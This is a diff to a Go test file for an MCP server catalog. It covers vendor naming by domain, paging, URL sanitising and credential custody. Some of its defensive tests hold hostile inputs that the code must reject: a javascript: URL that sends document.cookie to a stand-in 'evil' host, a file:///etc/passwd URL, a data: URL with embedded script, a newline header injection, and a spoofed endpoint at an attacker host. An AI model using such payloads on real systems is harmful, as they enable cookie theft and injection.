@@ -284,11 +284,14 @@ func TestSyncWalksEveryPage(t *testing.T) {
 // reads.
 func TestBrandNamesThePublisher(t *testing.T) {
 	for vendor, want := range map[string]string{
-		"com.stripe":      "stripe",
-		"ai.smithery":     "smithery",
-		"ac.inference.sh": "inference",
-		"io.github.alice": "alice",
+		"com.stripe":      "stripe-com",
+		"ai.smithery":     "smithery-ai",
+		"ac.inference.sh": "sh-inference-ac",
+		"io.github.alice": "alice-github-io",
 		"local":           "local",
+		// The whole reason it names the domain: anyone can own stripe.sh, and a
+		// handle taken from one label would render their tools as "stripe_…".
+		"sh.stripe": "stripe-sh",
 	} {
 		if got := brand(vendor); got != want {
 			t.Fatalf("brand(%q) = %q, want %q", vendor, got, want)
@@ -321,12 +324,17 @@ func catalogIDs(t *testing.T, app *zip.App, org string, admin bool, query string
 	var out struct {
 		Catalog []MCPListing `json:"catalog"`
 		Total   int          `json:"total"`
+		Limit   int          `json:"limit"`
+		Offset  int          `json:"offset"`
 	}
 	if err := json.Unmarshal(r.Body, &out); err != nil {
 		t.Fatalf("catalog shape: %v (%s)", err, r.Body)
 	}
-	if out.Total != len(out.Catalog) {
-		t.Fatalf("total %d disagrees with the %d listings returned", out.Total, len(out.Catalog))
+	if len(out.Catalog) > out.Limit {
+		t.Fatalf("a page of %d exceeds the limit %d it says it applied", len(out.Catalog), out.Limit)
+	}
+	if out.Total < len(out.Catalog) {
+		t.Fatalf("total %d is under the %d listings on this page", out.Total, len(out.Catalog))
 	}
 	ids := map[string]bool{}
 	for _, l := range out.Catalog {
@@ -435,8 +443,8 @@ func TestEnablingAListingIsTheSameRegistration(t *testing.T) {
 		t.Fatalf("server shape: %v (%s)", err, r.Body)
 	}
 	switch {
-	case srv.ID != "stripe":
-		t.Fatalf("the server id must name the vendor, got %q", srv.ID)
+	case srv.ID != "stripe-com":
+		t.Fatalf("the server id must name the vendor's DOMAIN, got %q", srv.ID)
 	case srv.URL != "https://mcp.stripe.com":
 		t.Fatalf("the endpoint must come from the listing, got %q", srv.URL)
 	case srv.Source != "catalog":
@@ -582,4 +590,171 @@ func serverCount(t *testing.T, app *zip.App, org string) int {
 		t.Fatalf("list servers: %v (%s)", err, r.Body)
 	}
 	return len(out.Servers)
+}
+
+// ── what the review found ───────────────────────────────────────────────────────
+
+// TestOfficialIsAboutTheEndpoint: the badge has to describe the field the reader
+// is about to trust. Enablement consumes the ENDPOINT and nothing else, so a
+// listing whose site is the vendor's while its endpoint is somewhere else is not
+// official — that is precisely the shape a credential-stealing entry would take.
+func TestOfficialIsAboutTheEndpoint(t *testing.T) {
+	elsewhere := MCPListing{
+		Vendor: "com.stripe", Site: "https://stripe.com",
+		Remotes: []MCPRemote{{Transport: "streamable-http", URL: "https://evil.attacker.example/mcp"}},
+	}
+	if isOfficial(elsewhere) {
+		t.Fatal("a listing served from a host the namespace does not own is not official, whatever its site says")
+	}
+	// With no endpoint at all there is nothing to enable, so the site is the only
+	// thing left to judge and it still means something.
+	if !isOfficial(MCPListing{Vendor: "com.stripe", Site: "https://stripe.com"}) {
+		t.Fatal("a package-only listing on the vendor's own site is theirs")
+	}
+}
+
+// TestUpstreamURLsAreDroppedUnlessAWebBrowserMayFollowThem: every one of these is
+// RENDERED, and they come from a third party. javascript: is what arrives.
+func TestUpstreamURLsAreDroppedUnlessAWebBrowserMayFollowThem(t *testing.T) {
+	for _, bad := range []string{
+		"javascript:fetch('https://evil/'+document.cookie)",
+		"data:text/html;base64,PHNjcmlwdD4=", "file:///etc/passwd", "not a url at all", "",
+	} {
+		if got := webURL(bad); got != "" {
+			t.Fatalf("webURL(%q) = %q, want it dropped", bad, got)
+		}
+	}
+	if got := webURL("https://cdn.example.com/logo.svg"); got != "https://cdn.example.com/logo.svg" {
+		t.Fatalf("a real https logo must survive, got %q", got)
+	}
+}
+
+// TestSyncSkipsANameItCannotAddress: listingID's reversibility rests on a
+// namespace never containing an underscore, and the id is the PRIMARY KEY. Two
+// names that collide would let the second inherit the first's curation — its
+// featured, admin-vouched standing — and replace its endpoint.
+func TestSyncSkipsANameItCannotAddress(t *testing.T) {
+	ts, _ := registry(t, []map[string]any{
+		entry("com.foo_bar/mcp", "a namespace with an underscore", remote("https://mcp.foo.example"), nil),
+		entry("com.evil/a/b", "two slashes", remote("https://mcp.evil.example"), nil),
+		entry("com.good/mcp", "fine", remote("https://mcp.good.com"), nil),
+	})
+	c := catalogOf(t, ts)
+	ctx := context.Background()
+	added, _, err := c.Sync(ctx)
+	if err != nil {
+		t.Fatalf("sync: %v", err)
+	}
+	if added != 1 {
+		t.Fatalf("only the addressable name may be stored, got %d rows", added)
+	}
+	if _, err := c.Get(ctx, "com.foo_bar_mcp"); err == nil {
+		t.Fatal("a name outside the registry's own grammar was stored anyway")
+	}
+}
+
+// TestAFailedSealLeavesNoRowClaimingACredential: the credential is sealed BEFORE
+// the row, so a KMS failure leaves the store as it was. A row asserting a
+// credential nobody stored does not fail loudly — the listing errors, the provider
+// skips the server, and its tools vanish from the org's plane in silence.
+func TestAFailedSealLeavesNoRowClaimingACredential(t *testing.T) {
+	app := shelf(t, entry("com.stripe/mcp", "payments", remote("https://mcp.stripe.com"), nil))
+	if r := do(t, app, http.MethodPost, "/v1/mcp/servers", "acme",
+		map[string]any{"listing": "com.stripe_mcp"}); r.Code != 201 {
+		t.Fatalf("enable: %d (%s)", r.Code, r.Body)
+	}
+	mounted.State.kms = brokenKMS{}
+	if r := do(t, app, http.MethodPost, "/v1/mcp/servers", "acme",
+		map[string]any{"listing": "com.stripe_mcp", "authHeader": "Authorization", "secret": "sk-live"}); r.Code != 500 {
+		t.Fatalf("a failed re-seal want 500, got %d (%s)", r.Code, r.Body)
+	}
+	srv, err := mounted.State.servers.Get(context.Background(), "acme", "stripe-com")
+	if err != nil {
+		t.Fatalf("the org's server must still be there: %v", err)
+	}
+	if srv.HasSecret {
+		t.Fatal("the row claims a credential the failed seal never stored")
+	}
+}
+
+// TestDeregisteringDestroysTheCredential: a customer's secret must not outlive the
+// thing it belonged to — that is what a deletion request and a rotation both mean.
+func TestDeregisteringDestroysTheCredential(t *testing.T) {
+	app := shelf(t, entry("com.stripe/mcp", "payments", remote("https://mcp.stripe.com"), nil))
+	kms := recordingKMS{}
+	mounted.State.kms = kms
+	if r := do(t, app, http.MethodPost, "/v1/mcp/servers", "acme",
+		map[string]any{"listing": "com.stripe_mcp", "authHeader": "Authorization", "secret": "sk-live"}); r.Code != 201 {
+		t.Fatalf("enable: %d (%s)", r.Code, r.Body)
+	}
+	if string(kms[authRef("acme", "stripe-com")]) != "sk-live" {
+		t.Fatalf("the credential was not sealed: %v", kms)
+	}
+	if r := do(t, app, http.MethodDelete, "/v1/mcp/servers/stripe-com", "acme", nil); r.Code != 204 {
+		t.Fatalf("deregister: %d (%s)", r.Code, r.Body)
+	}
+	if v := kms[authRef("acme", "stripe-com")]; len(v) != 0 {
+		t.Fatalf("the credential outlived the server it belonged to: %q", v)
+	}
+}
+
+// TestABadHeaderNameIsRefusedAtRegistration: net/http rejects it when the request
+// is BUILT, which is hours later inside a background listing, where the symptom is
+// a server whose tools quietly never appear.
+func TestABadHeaderNameIsRefusedAtRegistration(t *testing.T) {
+	app := newApp(t, nil)
+	for _, bad := range []string{"Auth orization", "X-Api-Key:", "X\nInjected"} {
+		r := do(t, app, http.MethodPost, "/v1/mcp/servers", "acme",
+			map[string]any{"name": "x", "url": "https://mcp.example.com/rpc", "authHeader": bad})
+		if r.Code != 400 {
+			t.Fatalf("authHeader %q want 400, got %d (%s)", bad, r.Code, r.Body)
+		}
+	}
+	if r := do(t, app, http.MethodPost, "/v1/mcp/servers", "acme",
+		map[string]any{"name": "x", "url": "https://mcp.example.com/rpc", "authHeader": "X-Api-Key"}); r.Code != 201 {
+		t.Fatalf("a real header name must be accepted, got %d (%s)", r.Code, r.Body)
+	}
+}
+
+// TestTheCatalogIsPaged: the public registry publishes tens of thousands of
+// servers, so an unbounded list is a twenty-megabyte response any org member can
+// ask for in a loop.
+func TestTheCatalogIsPaged(t *testing.T) {
+	many := make([]map[string]any, 0, 120)
+	for i := 0; i < 120; i++ {
+		many = append(many, entry(fmt.Sprintf("com.v%03d/mcp", i), "x", remote("https://mcp.example.com"), nil))
+	}
+	app := shelf(t, many...)
+
+	first := catalogIDs(t, app, "acme", false, "")
+	if len(first) != catalogPage {
+		t.Fatalf("the default page is %d listings, got %d", catalogPage, len(first))
+	}
+	page2 := catalogIDs(t, app, "acme", false, "?offset=50")
+	for id := range page2 {
+		if first[id] {
+			t.Fatalf("the second page repeats %q from the first", id)
+		}
+	}
+	if over := catalogIDs(t, app, "acme", false, "?limit=9999"); len(over) > catalogMax {
+		t.Fatalf("a limit past the maximum must be clamped to %d, got %d", catalogMax, len(over))
+	}
+}
+
+// recordingKMS is a custody that remembers what it was told to hold, so a test can
+// see a credential arrive and then be destroyed.
+type recordingKMS map[string][]byte
+
+func (k recordingKMS) GetSecret(_ context.Context, ref string) ([]byte, error) {
+	if v, ok := k[ref]; ok {
+		return v, nil
+	}
+	return nil, errors.New("no such secret")
+}
+func (k recordingKMS) PutSecret(_ context.Context, ref string, v []byte) error {
+	k[ref] = v
+	return nil
+}
+func (recordingKMS) Sign(context.Context, string, []byte) ([]byte, error) {
+	return nil, errors.New("not signing")
 }
